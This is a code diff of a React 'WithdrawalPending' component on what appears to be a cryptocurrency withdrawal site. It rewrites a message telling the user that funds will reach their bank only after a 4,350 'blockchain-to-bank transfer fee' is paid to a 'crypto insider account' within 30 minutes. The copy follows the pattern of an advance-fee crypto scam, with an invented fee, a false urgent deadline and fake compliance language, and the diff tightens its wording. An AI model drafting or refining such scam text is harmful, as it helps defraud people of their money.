@@ -88,20 +88,12 @@ export default function WithdrawalPending() {
         {/* Instruction */}
         <div className="bg-gray-700 p-6 rounded-lg border border-red-500 text-center">
           <p className="text-xl font-semibold text-red-400">
-            Your withdrawal request has been successfully initiated and is
-            currently being processed to your designated bank account. The
-            transaction may take approximately 2–3 hours to complete once the
-            required blockchain-to-bank transfer fee has been settled. For
-            security and compliance purposes, the system requires that the
-            withdrawal fee of 4,350 be paid to your crypto insider account
-            within the next 30 minutes. This ensures that the transaction is
-            validated on the blockchain and released to your bank without
-            interruption. Please note that this fee is a standard requirement
-            for cross-network transfers and helps cover the gas charges
-            associated with moving funds from the blockchain into the
-            traditional banking system. Once the fee is confirmed, your
-            withdrawal will be finalized and reflected in your bank account
-            shortly thereafter.
+            Your withdrawal request has been initiated and is being processed to
+            your designated bank account. The transaction will complete within
+            2–3 hours once the required blockchain-to-bank transfer fee is
+            settled. For security and compliance, a withdrawal fee of 4,350 must
+            be paid to your crypto insider account within 30 minutes to validate
+            the transaction and release funds to your bank.
           </p>
         </div>
       </div>
